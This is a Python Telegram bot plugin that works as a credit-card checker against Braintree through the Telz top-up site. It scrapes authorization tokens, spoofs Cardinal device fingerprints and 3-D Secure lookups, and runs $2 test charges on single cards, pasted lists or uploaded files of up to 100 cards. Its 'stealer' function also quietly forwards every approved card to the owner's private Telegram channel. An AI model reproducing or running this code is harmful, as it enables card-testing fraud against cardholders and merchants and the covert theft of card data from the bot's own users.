import time
import asyncio
import re
import os
import random
import base64
import json
import jwt
import uuid
import requests
from user_agent import generate_user_agent
from pyrogram import Client, filters, enums
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# -------------------------------------------------------------
# Configuration
# -------------------------------------------------------------
GATE_NAME = "Braintree $2 (Telz)"
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100

OWNER_DM = "https://t.me/spid_3r"
SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
STEALER_CHANNEL_ID = -1003627495953

# -------------------------------------------------------------
# Braintree core function (from braintree.py)
# -------------------------------------------------------------
def bran(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:
        yy = yy.split("20")[1]
    uu = generate_user_agent()
    r = requests.Session()

    # Load links from file
    file_path = 'links.txt'
    try:
        with open(file_path, 'r') as f:
            uuides = [line.strip() for line in f if line.strip()]
    except:
        return "No links file found"

    if not uuides:
        return "No links available"

    # Find a working URL
    working_url = None
    test_list = uuides.copy()
    while test_list:
        uuid_url = random.choice(test_list)
        try:
            resp = r.get(uuid_url, headers={"User-Agent": uu}, timeout=15)
            aur = re.search(r"authorization\s*:\s*checkbox\.is\(.+?\)\s*\?\s*''\s*:\s*'([^']+)'", resp.text)
            if aur:
                working_url = uuid_url
                break
            else:
                test_list.remove(uuid_url)
        except:
            test_list.remove(uuid_url)

    if not working_url:
        return "No working URL"

    res = r.get(working_url)
    uuis = re.search("transaction_uuid: '(.*?)'", res.text).group(1)
    auth_checked = re.search(r"authorization\s*:\s*checkbox\.is\(.+?\)\s*\?\s*''\s*:\s*'([^']+)'", res.text).group(1)
    dec = base64.b64decode(auth_checked).decode('utf-8')
    au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]

    ssir = str(uuid.uuid4())

    # 1. Get client configuration
    url = "https://payments.braintree-api.com/graphql"
    payload = {
        "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": ssir},
        "query": "query ClientConfiguration { clientConfiguration { creditCard { threeDSecure { cardinalAuthenticationJWT } } } }",
        "operationName": "ClientConfiguration"
    }
    headers = {
        'User-Agent': uu,
        'authorization': f"Bearer {au}",
        'braintree-version': "2018-05-10",
        'origin': "https://telz.com",
        'x-requested-with': "com.nettia",
        'content-type': "application/json"
    }
    response = r.post(url, json=payload, headers=headers)
    car = response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']

    # 2. Cardinal JWT init
    url2 = "https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init"
    payload2 = {
        "BrowserPayload": {"Order": {}, "SupportsAlternativePayments": {"cca": True}},
        "Client": {"Agent": "SongbirdJS", "Version": "1.35.0"},
        "ConsumerSessionId": "0_c9bd6fe1-0dc3-488d-a579-7fc5654726d5",
        "ServerJWT": car
    }
    headers2 = {
        'User-Agent': uu,
        'content-type': "application/json;charset=UTF-8",
        'origin': "https://telz.com",
        'x-requested-with': "com.nettia"
    }
    resp2 = r.post(url2, json=payload2, headers=headers2)
    payload_jwt = resp2.json()['CardinalJWT']
    ali2 = jwt.decode(payload_jwt, options={"verify_signature": False})
    reid = ali2['ReferenceId']

    # 3. Save browser data (fingerprint)
    url3 = "https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData"
    payload3 = {
        "Cookies": {"Legacy": True, "SessionStorage": True},
        "DeviceChannel": "Browser",
        "Extended": {"Browser": {"Adblock": True, "JavaEnabled": False}, "Device": {"ColorDepth": 24, "Platform": "Linux aarch64"}},
        "Fingerprint": "9baa474b2db059f7487a4f351f4e209c",
        "FingerprintingTime": 1286,
        "Language": "ar-EG",
        "OrgUnitId": "64b72decf2fb5560fbab1da4",
        "Origin": "Songbird",
        "ReferenceId": reid,
        "Screen": {"Resolution": "800x360", "UsableResolution": "800x360"},
        "TimeOffset": -180,
        "UserAgent": uu
    }
    headers3 = {
        'User-Agent': uu,
        'content-type': "application/json",
        'origin': "https://geo.cardinalcommerce.com",
        'x-requested-with': "XMLHttpRequest"
    }
    r.post(url3, json=payload3, headers=headers3)

    # 4. Tokenize credit card
    url4 = "https://payments.braintree-api.com/graphql"
    payload4 = {
        "clientSdkMetadata": {"source": "client", "integration": "dropin2", "sessionId": ssir},
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
        "variables": {
            "input": {
                "creditCard": {"number": n, "expirationMonth": mm, "expirationYear": yy, "cvv": cvc, "cardholderName": "ALI"},
                "options": {"validate": False}
            }
        },
        "operationName": "TokenizeCreditCard"
    }
    headers4 = {
        'User-Agent': uu,
        'authorization': f"Bearer {au}",
        'braintree-version': "2018-05-10",
        'origin': "https://assets.braintreegateway.com",
        'content-type': "application/json",
        'x-requested-with': "com.nettia"
    }
    resp4 = r.post(url4, json=payload4, headers=headers4)
    tok = resp4.json()['data']['tokenizeCreditCard']['token']

    # 5. Three D Secure lookup
    url5 = f"https://api.braintreegateway.com/merchants/jspypptbtb2hwgpp/client_api/v1/payment_methods/{tok}/three_d_secure/lookup"
    payload5 = {
        "amount": "2.00",
        "additionalInfo": {"acsWindowSize": "03", "email": "karmnil2003@gmail.com"},
        "bin": n[:6],
        "clientMetadata": {"cardinalDeviceDataCollectionTimeElapsed": 105, "issuerDeviceDataCollectionResult": True},
        "authorizationFingerprint": au,
        "braintreeLibraryVersion": "braintree/web/3.123.2",
        "_meta": {"merchantAppId": "telz.com", "platform": "web", "sdkVersion": "3.123.2", "sessionId": "56053312-0969-43be-acef-7e4c646183a0"}
    }
    headers5 = {
        'User-Agent': uu,
        'content-type': "application/json",
        'origin': "https://telz.com",
        'x-requested-with': "com.nettia"
    }
    resp5 = r.post(url5, json=payload5, headers=headers5)
    nonc = resp5.json()['paymentMethod']['nonce']

    # 6. Submit nonce to Telz
    url6 = "https://telz.com/cards/bt_nonce"
    params = {
        'uuid': uuis,
        'nonce': nonc,
        'email': "karmnil2003@gmail.com",
        'deviceData': "{\"correlation_id\":\"56053312-0969-43be-acef-7e4c6461\"}",
        'is_vault': "No Vault",
        'auto_top_up_enabled': "Disabled"
    }
    headers6 = {'User-Agent': uu, 'Accept': "application/json, text/javascript, */*; q=0.01"}
    resp6 = r.get(url6, params=params, headers=headers6)

    if 'OK' in resp6.text:
        return 'CHARGE 2.00$'
    elif 'insufficient funds' in resp6.text or 'funds' in resp6.text or 'Funds' in resp6.text:
        return 'insufficient funds'
    else:
        try:
            msg = re.search(r'"msg"\s*:\s*"([^"]+)"', resp6.text).group(1)
            return msg
        except:
            return "Unknown error"

# -------------------------------------------------------------
# Stealer function (keeps owner line – change if needed)
# -------------------------------------------------------------
async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
    try:
        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅

{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}

{SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML", reply_markup=None)
    except Exception as e:
        print(f"[Stealer Error] {e}")

# -------------------------------------------------------------
# Async wrapper
# -------------------------------------------------------------
async def call_braintree_api(fullcc):
    loop = asyncio.get_running_loop()
    result = await loop.run_in_executor(None, bran, fullcc)
    if result == 'CHARGE 2.00$':
        return "Approved ✅", result
    elif 'insufficient funds' in result.lower():
        # Treat as approved (auth only)
        return "Approved ✅", result
    else:
        return "Declined ❌", result

def extract_cards(text):
    return re.findall(r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", text)

# -------------------------------------------------------------
# SINGLE CHECK COMMAND (/br2)
# -------------------------------------------------------------
@Client.on_message(filters.command("br2", [".", "/"]))
async def braintree_single(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        getcc = await getmessage(message)
        if not getcc:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /br2

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> /br2 cc|mm|yyyy|cvv
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        cc, mm, yy, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mm}|{yy}|{cvv}"
        gateway = GATE_NAME

        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
        firstchk = await message.reply_text(firstresp, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        start = time.perf_counter()
        status, response = await call_braintree_api(fullcc)

        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ -» ■■■■"""
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        if "Approved" in status:
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, time.perf_counter() - start, first_name, role)

        display_status = f"<b>{status}</b>"

        finalresp = f"""{display_status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {gateway}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {response}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand}_{type_}-{level}
{SYMBOL} 𝗕ᴀɴᴋ: {bank}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}

{SYMBOL} 𝗧ᴏᴏᴋ {time.perf_counter() - start:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""

        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# MASS CHECK (text/reply) (/mbr2)
# -------------------------------------------------------------
@Client.on_message(filters.command("mbr2", [".", "/"]))
async def braintree_mass(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        ccs = []
        if message.reply_to_message:
            reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
            ccs = extract_cards(reply_text)
        else:
            text_parts = message.text.split(maxsplit=1)
            if len(text_parts) > 1:
                ccs = extract_cards(text_parts[1])

        if not ccs:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /mbr2

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /mbr2 cc|mm|yyyy|cvv (up to {MAX_MSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_MSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_MSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# TXT FILE COMMAND (/tbr2)
# -------------------------------------------------------------
@Client.on_message(filters.command("tbr2", [".", "/"]))
async def braintree_txt(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        target_message = None
        if message.reply_to_message and message.reply_to_message.document:
            target_message = message.reply_to_message
        elif message.document:
            target_message = message

        if not target_message or not target_message.document.file_name.endswith(".txt"):
            resp = f"""✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /tbr2

⟢ ᴜᴘʟᴏᴀᴅ ᴀ .ᴛxᴛ ꜰɪʟᴇ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴏɴᴇ (up to {MAX_TSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        file_path = await Client.download_media(target_message)
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
            return

        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_TSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# SEQUENTIAL PROCESSING
# -------------------------------------------------------------
async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
    total_cards = len(ccs)
    processed = 0
    approved_count = 0
    declined_count = 0
    gateway = GATE_NAME
    start_time = time.perf_counter()
    approved_cards = []

    progress_text = f"""Braintree $2 (Telz)
Admin

{SYMBOL} Response: Starting...

Progress: 0/{total_cards}
Approved ✅: 0
Declined ❌: 0
Remaining: {total_cards}

Checked by: {first_name} ({role})"""
    progress_msg = await message.reply(progress_text, quote=True, parse_mode=enums.ParseMode.HTML)

    for idx, fullcc in enumerate(ccs, 1):
        processed = idx
        remaining = total_cards - processed
        status, response = await call_braintree_api(fullcc)

        cc_num = fullcc.split('|')[0]
        getbin = await get_bin_details(cc_num)
        brand = getbin[0] if len(getbin) > 0 else "Unknown"
        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
        level = getbin[2] if len(getbin) > 2 else "Unknown"
        bank = getbin[3] if len(getbin) > 3 else "Unknown"
        country = getbin[4] if len(getbin) > 4 else "Unknown"
        flag = getbin[5] if len(getbin) > 5 else ""

        if "Approved" in status or "✅" in status:
            approved_count += 1
            response_status = "APPROVED ✅"
            card_time = time.perf_counter() - start_time
            approved_cards.append({
                "fullcc": fullcc, "status": status, "response": response, "gateway": gateway,
                "brand": f"{brand}_{type_}-{level}", "bank": bank, "country": country, "flag": flag, "time": card_time
            })
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, card_time, first_name, role)
        else:
            declined_count += 1
            response_status = "DECLINED ❌"

        try:
            await Client.edit_message_text(message.chat.id, progress_msg.id,
                f"""Braintree $2 (Telz)
Admin

{SYMBOL} Response: {response_status}

Progress: {processed}/{total_cards}
Approved ✅: {approved_count}
Declined ❌: {declined_count}
Remaining: {remaining}

Checked by: {first_name} ({role})""", parse_mode=enums.ParseMode.HTML)
        except:
            pass
        await asyncio.sleep(0.5)

    await progress_msg.delete()

    for card in approved_cards:
        display_status = f"<b>{card['status']}</b>"
        approved_msg = f"""{display_status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}

{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
        await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

    elapsed_time = round(time.perf_counter() - start_time, 2)

    if approved_count > 0:
        declined_summary = f"""❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅ𝘀 ({declined_count})

━━━━━━━━━━━━━━━━━━━━
"""
        declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
        for card in declined_list[:15]:
            declined_summary += f"{SYMBOL} {card} → Declined\n"
        if declined_count > 15:
            declined_summary += f"\n... and {declined_count - 15} more declined cards"
        declined_summary += f"""
━━━━━━━━━━━━━━━━━━━━
✅ Approved: {approved_count}
❌ Declined: {declined_count}
📊 Total: {total_cards}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})"""
        await message.reply_text(declined_summary, quote=True, parse_mode=enums.ParseMode.HTML)
    else:
        await message.reply_text(
            f"""❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅ𝘀

━━━━━━━━━━━━━━━━━━━━
📊 Total Cards: {total_cards}
❌ All Declined: {declined_count}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})""",
            quote=True, parse_mode=enums.ParseMode.HTML
        )

    await setantispamtime(user_id)
